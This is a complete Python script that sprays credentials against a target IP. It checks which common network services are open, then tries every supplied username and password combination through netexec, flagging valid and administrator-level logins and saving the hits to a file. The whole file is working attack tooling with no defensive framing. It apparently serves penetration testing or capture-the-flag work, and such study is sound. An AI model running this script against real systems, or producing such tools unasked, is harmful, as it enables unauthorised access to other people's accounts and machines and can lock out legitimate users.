#!/usr/bin/env python3
"""
cred-spray.py — Spray found credentials across all discovered services
Usage: python3 cred-spray.py -t <IP> -u <user_or_file> -p <pass_or_file> [--services smb,ssh,winrm]

Takes a username (or file of usernames) and password (or file of passwords)
and sprays them across every common service on the target.
"""

import subprocess
import argparse
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
NC = '\033[0m'

SERVICES = {
    'smb':    {'ports': [445, 139],   'tool': 'netexec', 'proto': 'smb'},
    'ssh':    {'ports': [22],         'tool': 'netexec', 'proto': 'ssh'},
    'winrm':  {'ports': [5985, 5986], 'tool': 'netexec', 'proto': 'winrm'},
    'rdp':    {'ports': [3389],       'tool': 'netexec', 'proto': 'rdp'},
    'ftp':    {'ports': [21],         'tool': 'netexec', 'proto': 'ftp'},
    'mssql':  {'ports': [1433],       'tool': 'netexec', 'proto': 'mssql'},
    'ldap':   {'ports': [389, 636],   'tool': 'netexec', 'proto': 'ldap'},
    'wmi':    {'ports': [135],        'tool': 'netexec', 'proto': 'wmi'},
}


def check_port(ip, port, timeout=2):
    """Quick TCP connect check"""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False


def discover_services(ip, requested=None):
    """Find which services are actually open on the target"""
    found = []
    services_to_check = SERVICES

    if requested:
        services_to_check = {k: v for k, v in SERVICES.items() if k in requested}

    for svc, info in services_to_check.items():
        for port in info['ports']:
            if check_port(ip, port):
                found.append(svc)
                break

    return found


def load_list(value):
    """Load from file if path exists, otherwise treat as single value"""
    if os.path.isfile(value):
        with open(value) as f:
            return [line.strip() for line in f if line.strip()]
    return [value]


def spray_netexec(ip, proto, user, password):
    """Spray a single user:pass combo via netexec"""
    cmd = ['netexec', proto, ip, '-u', user, '-p', password, '--no-bruteforce']

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout.strip()

        if '[+]' in output or 'Pwn3d!' in output:
            pwned = '(Pwn3d!)' if 'Pwn3d!' in output else ''
            return True, f"{GREEN}[+] {proto.upper()} → {user}:{password} {pwned}{NC}"
        else:
            return False, f"[-] {proto.upper()} → {user}:{password}"
    except subprocess.TimeoutExpired:
        return False, f"[!] {proto.upper()} → {user}:{password} (timeout)"
    except FileNotFoundError:
        return False, f"{RED}[!] netexec not found — install it: pip install netexec{NC}"


def spray_hydra(ip, service, user, password, port=None):
    """Fallback to hydra for services netexec doesn't cover"""
    cmd = ['hydra', '-l', user, '-p', password, f'{ip}', service]
    if port:
        cmd.extend(['-s', str(port)])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if 'successfully' in result.stdout.lower() or '1 valid' in result.stdout.lower():
            return True, f"{GREEN}[+] {service.upper()} → {user}:{password} (hydra){NC}"
        return False, f"[-] {service.upper()} → {user}:{password}"
    except:
        return False, f"[!] {service.upper()} → hydra failed"


def main():
    parser = argparse.ArgumentParser(description='Spray creds across all services')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-u', '--users', required=True, help='Username or file of usernames')
    parser.add_argument('-p', '--passwords', required=True, help='Password or file of passwords')
    parser.add_argument('--services', help='Comma-separated services to target (default: auto-discover)')
    parser.add_argument('--threads', type=int, default=5, help='Concurrent threads (default: 5)')
    parser.add_argument('-o', '--output', help='Save hits to file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show failed attempts too')
    args = parser.parse_args()

    ip = args.target
    users = load_list(args.users)
    passwords = load_list(args.passwords)
    requested = args.services.split(',') if args.services else None

    print(f"{CYAN}╔══════════════════════════════════════╗{NC}")
    print(f"{CYAN}║        cred-spray.py                 ║{NC}")
    print(f"{CYAN}╚══════════════════════════════════════╝{NC}")
    print(f"{YELLOW}[*] Target: {ip}{NC}")
    print(f"{YELLOW}[*] Users: {len(users)} | Passwords: {len(passwords)}{NC}")

    # Discover open services
    print(f"{YELLOW}[*] Discovering services...{NC}")
    active = discover_services(ip, requested)

    if not active:
        print(f"{RED}[!] No target services found open.{NC}")
        sys.exit(1)

    print(f"{GREEN}[+] Active services: {', '.join(active)}{NC}")
    print(f"{YELLOW}[*] Starting spray ({len(users) * len(passwords) * len(active)} attempts)...{NC}")
    print()

    hits = []

    for svc in active:
        info = SERVICES[svc]
        for user in users:
            for password in passwords:
                success, msg = spray_netexec(ip, info['proto'], user, password)

                if success:
                    print(msg)
                    hits.append(f"{svc}: {user}:{password}")
                elif args.verbose:
                    print(msg)

    # Summary
    print()
    print(f"{CYAN}{'='*40}{NC}")
    if hits:
        print(f"{GREEN}[+] VALID CREDENTIALS FOUND:{NC}")
        for h in hits:
            print(f"  {GREEN}→ {h}{NC}")

        if args.output:
            with open(args.output, 'w') as f:
                f.write('\n'.join(hits))
            print(f"{GREEN}[+] Saved to {args.output}{NC}")
    else:
        print(f"{RED}[-] No valid credentials found.{NC}")


if __name__ == '__main__':
    main()
